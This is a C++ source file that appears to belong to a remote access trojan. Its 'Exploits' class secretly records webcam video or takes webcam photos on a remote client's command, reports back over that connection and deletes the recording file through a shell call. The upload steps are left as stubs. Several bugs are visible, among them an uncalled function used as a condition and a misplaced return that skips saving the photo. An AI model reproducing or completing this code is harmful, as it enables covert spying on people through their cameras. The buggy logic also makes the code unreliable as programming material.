#include "Exploits.h"
#define WEBCAM_FILE "webcam.avi"
#define PHOTOCAM_FILE "photo.jpg"

using namespace cv;

bool Exploits::webcam(Client* client, std::string minute)
{
	if (take_webcam)
	{
		client->send_b("Webcam succeed !");
		client->send_b("Now starting the upload ...");
		// Upload on server ..
	}
	client->send_b((std::string("Erasing ") + std::string(WEBCAM_FILE) + " ...").c_str());
	system((std::string("ERASE ")+std::string(WEBCAM_FILE)).c_str());
	client->send_b("Done");
	return 1;
}
bool Exploits::take_webcam(Client* client, std::string minute)
{
	// Add openv build bin to path 
	// Add additional directory in Projet properties --> C/C++ general --> opencv/build/include
	// IMPORTANT RUN IN x64
	// ADD LIB to Linker --> additionnal libraries opencv/build/x64/lib/vs15
	// Add Input --> additional file --> opencv_world410d ( d for debug mode)

	const int refresh = 100;
	int minu = atoi(minute.c_str());
	const int sec = 60*minu;
	client->send_b((std::string("Starting the reccord for : ") + minute).c_str());

	VideoCapture cap(0);
	int frame_width = cap.get(CAP_PROP_FRAME_WIDTH);
	int frame_height = cap.get(CAP_PROP_FRAME_HEIGHT);
	// open the default camera, use something different from 0 otherwise;
	// Check VideoCapture documentation.
	VideoWriter video(WEBCAM_FILE, VideoWriter::fourcc('M', 'J', 'P', 'G'), 10, Size(frame_width, frame_height));
	auto start = std::chrono::steady_clock::now();

	while (1)
	{
		Mat frame;
		// Capture frame-by-frame 
		cap >> frame;

		// If the frame is empty, break immediately
		if (frame.empty())
			return 0;
			break;

		// Write the frame into the file 'outcpp.avi'
		video.write(frame);

		// Display the resulting frame    
		//imshow("Frame", frame);

		// Press  ESC on keyboard to  exit
		//char c = (char)waitKey(1);
		//if (c == 27)
			//break;
		Sleep(refresh);
		auto end = std::chrono::steady_clock::now();
		std::cout << std::chrono::duration_cast<std::chrono::seconds>(end - start).count() << " elipsed" << std::endl;
		if (std::chrono::duration_cast<std::chrono::seconds>(end - start).count() == sec)
		{
			std::cout << sec << " sec elipsed" << std::endl;
			client->send_b("Done");
			return 1;
		}
	}
	return 1;
}
bool Exploits::webcam_photo(Client* client)
{
	if (take_photo(client))
	{
// Upload
	}
	return 1;
}
bool Exploits::take_photo(Client* client)
{
	client->send_b("Taking the photo ...");
	VideoCapture cap(0);
	Mat frame;
	// Capture frame-by-frame 
	cap >> frame;

	// If the frame is empty, break immediately
	if (frame.empty())
		client->send_b("Error, unable to have image");
	return 0;

	imwrite(PHOTOCAM_FILE, frame);
	client->send_b("Done");
	return 1;
}